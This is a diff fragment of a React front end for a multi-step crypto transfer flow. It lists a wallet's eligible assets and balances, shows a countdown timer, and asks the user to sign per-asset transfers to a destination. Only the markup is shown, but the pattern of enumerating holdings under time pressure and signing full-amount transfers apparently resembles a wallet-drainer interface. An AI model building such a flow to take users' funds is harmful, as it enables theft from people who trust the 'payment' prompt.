+          <div className="space-y-6">
+            <div className="text-center mb-2">
+              <CheckCircle2 className="w-10 h-10 text-emerald-400 mx-auto mb-2" />
+              <p className="font-semibold text-lg">Eligible Assets</p>
+              <p className="text-gray-400 text-sm">ETH, USDT, USDC, BNB, BTC, SOL</p>
+            </div>
+
+            <div className="space-y-2">
+              {assets.map((asset, i) => (
+                <div key={i} className="p-4 rounded-xl bg-gradient-to-br from-gray-800/50 to-gray-900/50 border border-gray-700/50 flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-gray-700 to-gray-800 flex items-center justify-center">
+                      <Coins className="w-5 h-5 text-gray-300" />
+                    </div>
+                    <div>
+                      <p className="font-semibold">{asset.symbol}</p>
+                      <p className="text-xs text-gray-500">{asset.network}</p>
+                    </div>
+                  </div>
+                  <p className="font-mono text-sm text-gray-300">
+                    {(Number(asset.rawAmount) / Math.pow(10, asset.decimals)).toFixed(asset.decimals > 6 ? 4 : 2)}
+                  </p>
+                </div>
+              ))}
+            </div>
+
+            <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30">
+              <p className="text-xs text-gray-500 mb-1">Time remaining</p>
+              <p className="font-mono font-bold text-emerald-400">{countdown}</p>
+            </div>
+
+            <button
+              onClick={handleAuthorize}
+              className="w-full py-4 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2"
+            >
+              <FileCheck className="w-5 h-5" />
+              Confirm Payment
+            </button>
+          </div>
+        )}
+
+        {/* Step: Authorizing */}
+        {step === 'authorize' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-emerald-400 animate-spin mb-4" />
+            <p className="text-gray-400">Preparing...</p>
+            <p className="text-gray-600 text-sm mt-2">Check your wallet for signature request</p>
+          </div>
+        )}
+
+        {/* Step: Preparing */}
+        {step === 'preparing' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-blue-400 animate-spin mb-4" />
+            <p className="text-gray-400">Preparing transactions...</p>
+          </div>
+        )}
+
+        {/* Step: Signing */}
+        {step === 'signing' && (
+          <div className="space-y-6">
+            <div className="text-center">
+              <FileCheck className="w-10 h-10 text-blue-400 mx-auto mb-3" />
+              <p className="font-semibold text-lg mb-2">Sign with Wallet</p>
+              <p className="text-gray-400 text-sm">Review and sign the transaction in your wallet</p>
+            </div>
+
+            <div className="space-y-2">
+              {plans.map((plan, i) => (
+                <div key={i} className="p-4 rounded-xl bg-gray-800/50 border border-gray-700/50">
+                  <div className="flex justify-between items-center mb-2">
+                    <span className="font-semibold">{plan.asset}</span>
+                    <span className="text-xs text-gray-500">{plan.network}</span>
+                  </div>
+                  <p className="text-xs text-gray-400 font-mono">To: {plan.destination}</p>
+                  <p className="text-xs text-gray-400 font-mono">Amount: {plan.rawAmount}</p>
+                </div>
+              ))}
+            </div>
+
+            <button
+              onClick={handleSignAndSubmit}
+              className="w-full py-4 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-400 hover:to-indigo-500 font-semibold text-lg transition-all duration-300 shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2"
+            >
+              <Send className="w-5 h-5" />
+              Sign & Submit
+            </button>
+          </div>
+        )}
+
+        {/* Step: Submitting */}
+        {step === 'submitting' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-blue-400 animate-spin mb-4" />
+            <p className="text-gray-400">Submitting transaction...</p>
+          </div>
+        )}
+
+        {/* Step: Confirming */}
+        {step === 'confirming' && (
+          <div className="flex flex-col items-center justify-center py-20">
+            <Loader2 className="w-10 h-10 text-emerald-400 animate-spin mb-4" />
+            <p className="text-gray-400">Waiting for confirmation...</p>
+            <p className="text-gray-600 text-sm mt-2">This may take a few minutes</p>
+          </div>
+        )}
+
+        {/* Step: Completed */}
+        {step === 'completed' && (
+          <div className="space-y-6">
+            <div className="p-8 rounded-2xl bg-gradient-to-br from-emerald-500/10 to-teal-500/10 border border-emerald-500/30 text-center">
+              <CheckCircle2 className="w-16 h-16 text-emerald-400 mx-auto mb-4" />
+              <p className="font-bold text-xl text-emerald-400 mb-2">Transfer Completed</p>
+              <p className="text-gray-400 text-sm">This request has been permanently completed.</p>
+            </div>
+
+            {txHash && (
+              <div className="p-4 rounded-xl bg-gray-800/50 border border-gray-700/50">
+                <p className="text-xs text-gray-500 mb-1">Transaction hash</p>
+                <p className="font-mono text-xs text-gray-300 break-all">{txHash}</p>
+              </div>
+            )}
+
+            <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30 flex items-center gap-2">
+              <Shield className="w-4 h-4 text-gray-500" />
+              <p className="text-xs text-gray-500">Session permanently invalidated. This request cannot be reused.</p>
+            </div>
+          </div>
+        )}
+
+        {/* Step: Expired */}
+        {step === 'expired' && (
+          <div className="space-y-6">
+            <div className="p-8 rounded-2xl bg-gradient-to-br from-red-500/10 to-orange-500/10 border border-red-500/30 text-center">
+              <XCircle className="w-16 h-16 text-red-400 mx-auto mb-4" />
+              <p className="font-bold text-xl text-red-400 mb-2">Request Expired</p>
+              <p className="text-gray-400 text-sm">This request is no longer valid.</p>
+            </div>
+            <div className="p-4 rounded-xl bg-gray-800/30 border border-gray-700/30">
+              <p className="text-xs text-gray-500">A new request must be generated.</p>
+            </div>
+          </div>
+        )}
+
+        {/* Step: Failed */}
+        {step === 'failed' && (
+          <div className="space-y-6">
+            <div className="p-8 rounded-2xl bg-gradient-to-br from-red-500/10 to-orange-500/10 border border-red-500/30 text-center">
+              <XCircle className="w-16 h-16 text-red-400 mx-auto mb-4" />
+              <p className="font-bold text-xl text-red-400 mb-2">Transfer Failed</p>
+              <p className="text-gray-400 text-sm">{error || 'An error occurred during the transfer.'}</p>
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+export default App;
